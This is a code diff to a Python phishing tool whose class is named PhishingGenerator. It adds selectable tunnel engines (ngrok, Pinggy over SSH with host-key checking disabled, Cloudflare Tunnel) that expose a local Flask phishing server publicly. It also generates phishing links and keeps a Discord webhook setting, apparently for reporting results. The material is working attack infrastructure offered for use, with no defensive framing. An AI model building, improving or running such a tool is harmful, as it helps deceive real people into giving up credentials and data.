@@ -24,6 +24,10 @@ from bs4 import BeautifulSoup
 
 SESSION_FILE = '.phishgen_session.json'
 
+TUNNEL_NGROK = "ngrok"
+TUNNEL_PINGGY = "pinggy"
+TUNNEL_CLOUDFLARE = "cloudflare"
+
 console = Console()
 
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
@@ -100,6 +104,9 @@ class PhishingGenerator:
         self.webhook_url = self._load_session_key('webhook_url')
         self.ngrok_region = self._load_session_key('ngrok_region') or 'ap'
         self.server_port = self._load_session_key('server_port') or 5000
+        self.tunnel_type = self._load_session_key('tunnel_type') or TUNNEL_NGROK
+        self.tunnel_process = None
+        self.cf_token = self._load_session_key('cf_token')
         
         # Setup logging
         try:
@@ -675,6 +682,118 @@ class PhishingGenerator:
             console.print(f"[red]❌ Auto-install failed: {str(e)[:80]}[/]")
             console.print("[yellow]Try manual install: https://ngrok.com/download[/]")
 
+    def select_tunnel_engine(self):
+        self.clear_screen()
+        console.print(Panel("[cyan]🔌 Select Tunnel Engine / Pilih Engine Tunnel[/]", border_style="cyan"))
+        current = self.tunnel_type
+        console.print(f"\n[1] Ngrok {'✅ (current)' if current == TUNNEL_NGROK else ''}")
+        console.print(f"    [dim]Stable, feature-rich, but has security page[/]")
+        console.print(f"[2] Pinggy {'✅ (current)' if current == TUNNEL_PINGGY else ''}")
+        console.print(f"    [dim]Fast, no auth needed, SSH-based, no redirect[/]")
+        console.print(f"[3] Cloudflare Tunnel {'✅ (current)' if current == TUNNEL_CLOUDFLARE else ''}")
+        console.print(f"    [dim]Fast, stable, needs token (saved in session)[/]")
+        while True:
+            c = console.input(f"\n[yellow][[?]] Select (1-3): [/]")
+            if c == "1":
+                self.tunnel_type = TUNNEL_NGROK
+                break
+            elif c == "2":
+                self.tunnel_type = TUNNEL_PINGGY
+                break
+            elif c == "3":
+                self.tunnel_type = TUNNEL_CLOUDFLARE
+                break
+        self._save_session_key('tunnel_type', self.tunnel_type)
+
+    def _start_pinggy(self):
+        addr = str(self.server_port)
+        console.print(f"[cyan]⟳ Starting Pinggy tunnel on port {addr}...[/]")
+        try:
+            self.tunnel_process = subprocess.Popen(
+                ["ssh", "-p", "443", "-R", f"0:localhost:{addr}", "-o", "StrictHostKeyChecking=no",
+                 "-o", "ServerAliveInterval=30", "free.pinggy.io"],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            time.sleep(5)
+            url = None
+            start = time.time()
+            while time.time() - start < 20:
+                line = self.tunnel_process.stdout.readline()
+                if line and ('://' in line or '.pinggy' in line):
+                    for word in line.strip().split():
+                        if '://' in word or '.pinggy' in word:
+                            url = word.strip()
+                            break
+                if url:
+                    break
+            if url:
+                self.server_url = url
+                console.print(f"[green]✅ Pinggy tunnel: {url}[/]")
+            else:
+                raise Exception("Could not parse Pinggy URL from output")
+        except Exception as e:
+            msg = f"❌ Pinggy failed: {str(e)[:80]}"
+            self.logger.error(msg)
+            console.print(f"[red]{msg}[/]")
+            self.server_url = None
+
+    def _start_cloudflare(self):
+        addr = str(self.server_port)
+        if not self.cf_token:
+            self.cf_token = console.input("\n[yellow][[?]] Enter Cloudflare Tunnel token: [/]")
+            self._save_session_key('cf_token', self.cf_token)
+        try:
+            subprocess.run(["cloudflared", "version"], capture_output=True, check=True, timeout=10)
+        except:
+            console.print("[red]❌ cloudflared not found![/]")
+            is_termux = bool(os.environ.get('PREFIX'))
+            if is_termux:
+                console.print("[yellow]Install: pkg install cloudflared[/]")
+            else:
+                console.print("[yellow]Download from: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/[/]")
+            console.input("\n[green]Press Enter after installing cloudflared...[/]")
+            self._start_cloudflare()
+            return
+
+        console.print(f"[cyan]⟳ Starting Cloudflare tunnel...[/]")
+        try:
+            self.tunnel_process = subprocess.Popen(
+                ["cloudflared", "tunnel", "--no-autoupdate", "run", "--token", self.cf_token],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+            )
+            time.sleep(6)
+            url = None
+            start = time.time()
+            while time.time() - start < 25:
+                line = self.tunnel_process.stdout.readline()
+                if line and ('://' in line and 'trycloudflare.com' in line):
+                    for word in line.strip().split():
+                        if '://' in word and 'trycloudflare.com' in word:
+                            url = word.strip()
+                            break
+                if url:
+                    break
+            if url:
+                self.server_url = url
+                console.print(f"[green]✅ Cloudflare tunnel: {url}[/]")
+            else:
+                console.print("[yellow]Cloudflare tunnel started, awaiting URL... check logs[/]")
+                self.server_url = f"http://localhost:{addr}"
+        except Exception as e:
+            msg = f"❌ Cloudflare failed: {str(e)[:80]}"
+            self.logger.error(msg)
+            console.print(f"[red]{msg}[/]")
+            self.server_url = None
+
+    def setup_tunnel(self):
+        self.clear_screen()
+        if self.tunnel_type == TUNNEL_NGROK:
+            self.setup_ngrok()
+        elif self.tunnel_type == TUNNEL_PINGGY:
+            self._start_pinggy()
+        elif self.tunnel_type == TUNNEL_CLOUDFLARE:
+            self._start_cloudflare()
+
     def setup_ngrok(self):
         """Setup ngrok tunnel dengan session token"""
         self.clear_screen()
@@ -749,7 +868,7 @@ class PhishingGenerator:
             console.print(f"[green]{msg}[/]")
 
         except Exception as e:
-            msg = f"❌ Gagal membuat tunnel ngrok: {str(e)}"
+            msg = f"❌ Tunnel failed: {str(e)}"
             self.logger.error(msg)
             console.print(f"[red]{msg}[/]")
             self.server_url = None
@@ -757,18 +876,38 @@ class PhishingGenerator:
     def settings_menu(self):
         self.clear_screen()
         regions = {'us': 'United States', 'eu': 'Europe', 'ap': 'Asia Pacific', 'au': 'Australia', 'sa': 'South America', 'jp': 'Japan', 'in': 'India'}
+        tunnel_names = {TUNNEL_NGROK: 'Ngrok', TUNNEL_PINGGY: 'Pinggy', TUNNEL_CLOUDFLARE: 'Cloudflare'}
         console.print(Panel("⚙️ Settings", border_style="cyan"))
         console.print(f"\n[cyan]Current settings:[/]")
+        console.print(f"  [yellow]Tunnel Engine:[/] {tunnel_names.get(self.tunnel_type, self.tunnel_type)}")
         console.print(f"  [yellow]Ngrok Region:[/] {self.ngrok_region.upper()} ({regions.get(self.ngrok_region, 'Unknown')})")
         console.print(f"  [yellow]Server Port:[/] {self.server_port}")
         console.print(f"  [yellow]Webhook URL:[/] {self.webhook_url or 'Not set'}")
-        console.print("\n[1] Change ngrok region")
-        console.print("[2] Change server port")
-        console.print("[3] Set Discord webhook URL")
-        console.print("[4] Clear webhook URL")
-        console.print("[5] Back to menu")
-        choice = console.input("\n[yellow][[?]] Select option (1-5): [/]")
+        console.print("\n[1] Change tunnel engine")
+        console.print("[2] Change ngrok region")
+        console.print("[3] Change server port")
+        console.print("[4] Set Discord webhook URL")
+        console.print("[5] Clear webhook URL")
+        console.print("[6] Back to menu")
+        choice = console.input("\n[yellow][[?]] Select option (1-6): [/]")
         if choice == "1":
+            console.print("\n[1] Ngrok")
+            console.print("[2] Pinggy (SSH, no auth)")
+            console.print("[3] Cloudflare Tunnel")
+            c = console.input("\n[yellow]Select tunnel engine (1-3): [/]")
+            if c == "1":
+                self.tunnel_type = TUNNEL_NGROK
+                self._save_session_key('tunnel_type', TUNNEL_NGROK)
+                console.print("[green]✓ Tunnel engine: Ngrok (restart required)[/]")
+            elif c == "2":
+                self.tunnel_type = TUNNEL_PINGGY
+                self._save_session_key('tunnel_type', TUNNEL_PINGGY)
+                console.print("[green]✓ Tunnel engine: Pinggy (restart required)[/]")
+            elif c == "3":
+                self.tunnel_type = TUNNEL_CLOUDFLARE
+                self._save_session_key('tunnel_type', TUNNEL_CLOUDFLARE)
+                console.print("[green]✓ Tunnel engine: Cloudflare (restart required)[/]")
+        elif choice == "2":
             console.print("\nAvailable regions:")
             for code, name in regions.items():
                 console.print(f"  [{code}] {name}")
@@ -777,7 +916,7 @@ class PhishingGenerator:
                 self.ngrok_region = reg
                 self._save_session_key('ngrok_region', reg)
                 console.print(f"[green]✓ Region set to {reg.upper()}[/]")
-        elif choice == "2":
+        elif choice == "3":
             try:
                 port = int(console.input("\n[yellow]Enter port number (1024-65535): [/]"))
                 if 1024 <= port <= 65535:
@@ -788,7 +927,7 @@ class PhishingGenerator:
                     console.print("[red]Port must be between 1024 and 65535[/]")
             except:
                 console.print("[red]Invalid port[/]")
-        elif choice == "3":
+        elif choice == "4":
             url = console.input("\n[yellow]Enter Discord webhook URL: [/]")
             if url.startswith('https://discord.com/api/webhooks/'):
                 self.webhook_url = url
@@ -796,7 +935,7 @@ class PhishingGenerator:
                 console.print("[green]✓ Webhook URL saved[/]")
             else:
                 console.print("[red]Invalid Discord webhook URL[/]")
-        elif choice == "4":
+        elif choice == "5":
             self.webhook_url = None
             self._save_session_key('webhook_url', None)
             console.print("[green]✓ Webhook URL cleared[/]")
@@ -911,7 +1050,7 @@ class PhishingGenerator:
         """Generate link phishing dengan penanganan error yang lebih baik"""
         try:
             if not self.server_url:
-                raise ValueError("Server URL tidak tersedia. Silakan periksa koneksi ngrok.")
+                raise ValueError("Server URL tidak tersedia. Silakan periksa koneksi tunnel.")
                 
             phish_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
             phish_url = f"{self.server_url}/phish/{phish_id}?type={phish_type}&url={target_url}"
@@ -975,9 +1114,8 @@ class PhishingGenerator:
         """Menjalankan program phishing dengan tampilan realtime"""
         try:
             self.select_language()
-            self.setup_ngrok()
-            
-            # Start Flask di thread terpisah dengan opsi threaded=True dan host 0.0.0.0
+            self.select_tunnel_engine()
+
             flask_thread = threading.Thread(
                 target=lambda: self.app.run(
                     host='0.0.0.0', 
@@ -988,6 +1126,9 @@ class PhishingGenerator:
             )
             flask_thread.daemon = True
             flask_thread.start()
+            time.sleep(1)
+
+            self.setup_tunnel()
             
             while True:
                 self.clear_screen()
@@ -1065,6 +1206,9 @@ class PhishingGenerator:
         finally:
             if self.live_display:
                 self.live_display.stop()
+            if self.tunnel_process:
+                try: self.tunnel_process.terminate()
+                except: pass
             ngrok.kill()
 
 if __name__ == "__main__":
